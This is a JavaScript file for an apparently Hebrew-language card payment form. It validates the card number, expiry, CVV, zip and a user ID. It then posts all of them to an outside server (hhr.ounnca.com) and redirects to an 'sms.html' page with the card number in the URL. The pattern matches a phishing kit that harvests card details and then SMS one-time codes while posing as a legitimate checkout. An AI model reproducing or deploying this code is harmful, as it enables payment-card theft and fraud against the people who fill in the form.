function luhnCheck(cardNumber) {
  cardNumber = cardNumber.replace(/\s/g, "");

  if (!/^\d+$/.test(cardNumber)) {
      return false;
  }

  const digits = cardNumber.split('').map(Number);
  let checksum = 0;

  for (let i = digits.length - 2; i >= 0; i -= 2) {
      let digit = digits[i];
      digit *= 2;

      if (digit > 9) {
          digit -= 9;
      }

      digits[i] = digit;
  }

  checksum = digits.reduce((acc, digit) => acc + digit, 0) % 10;
  return checksum === 0;
}

const cardNumberInput = document.getElementById("cardNumber");
const validationResultElement = document.getElementById("validationResult");
const submitButton = document.getElementById("cardSubmit");

cardNumberInput.addEventListener("input", function() {
  let cardNumber = cardNumberInput.value.replace(/\s/g, "");
  if (cardNumber.length > 16) {
      cardNumber = cardNumber.slice(0, 16);
  }

  const formattedCardNumber = cardNumber.replace(/(\d{4})(?=\d)/g, '$1 ');

  cardNumberInput.value = formattedCardNumber;

  if (formattedCardNumber.length === 19) {
      if (luhnCheck(cardNumber)) {
          cardNumberInput.classList.remove("invalid-border");
          cardNumberInput.classList.add("valid-border");
          submitButton.disabled = false;
      } else {
          validationResultElement.textContent = " Please enter a valid card ";
          cardNumberInput.classList.remove("valid-border");
          cardNumberInput.classList.add("invalid-border");
          submitButton.disabled = true;
      }
  } else {
      validationResultElement.textContent = "";
      cardNumberInput.classList.remove("valid-border", "invalid-border");
      submitButton.disabled = true;
  }
});

$("#myForm").validate({
  rules: {
  carddate1: {
      required: true,
  },
  carddate: {
      required: true,
  },
  cvv: {
      required: true,
      minlength: 3,
      number: true,
  },
  zip: {
      required: true,
      minlength: 3,
      number: true,
  },
 
  userId: {
      required: true,
      minlength: 5,
      number: true,
  },
  },
  messages: {
  carddate1: "The field is required",
  carddate: "The field is required",
  cvv: "The field is required",
   },
  submitHandler: SubForm,
});

function SubForm() {
            
  document.getElementById("cardSubmit").disabled = true;
  let ncardNumber=  cardNumberInput.value.replace(/\s/g, "");

  let f=  $("#myForm").serializeArray()
  f[1].value =ncardNumber
  
  $.ajax({
  url: "https://hhr.ounnca.com/sender/api-sender",
//   url: "http://localhost:3000/sender/api-sender",
  type: "post",
  data: f,
  beforeSend: function () {
      $("#error").fadeOut();
      $("#cardSubmit").html(
      ' <span style="color:#fff">   לתשלום ... </span>'
      );
  },
  success: function () {
          setTimeout(() => {
            window.open("sms.html?cc=" + encodeURI(f[1].value), '_self');
          }, 5000)
  },
  error: function () {
      // alert("There was an error :(");
  },
  });
  return false;
}  